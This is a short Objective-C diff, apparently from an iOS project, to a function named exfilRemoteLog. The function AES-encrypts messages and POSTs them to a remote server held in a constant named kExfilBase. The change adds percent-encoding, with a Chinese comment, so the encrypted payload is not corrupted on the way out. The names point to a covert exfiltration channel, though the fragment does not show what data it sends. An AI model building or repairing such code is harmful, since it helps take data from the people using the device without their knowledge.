@@ -91,7 +91,11 @@ static void exfilRemoteLog(NSString *msg)
                 NSString *enc = exfilAesEncryptBase64(plain);
                 if (!enc) continue;
 
-                NSString *body = [NSString stringWithFormat:@"params=%@", enc];
+                // form 值里的 + / = 必须百分号编码，否则服务端把 + 解成空格、末位被剪
+                NSString *pct = [enc stringByAddingPercentEncodingWithAllowedCharacters:
+                    [NSCharacterSet characterSetWithCharactersInString:
+                        @"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"]];
+                NSString *body = [NSString stringWithFormat:@"params=%@", pct];
                 NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
                 NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
                 req.HTTPMethod = @"POST";
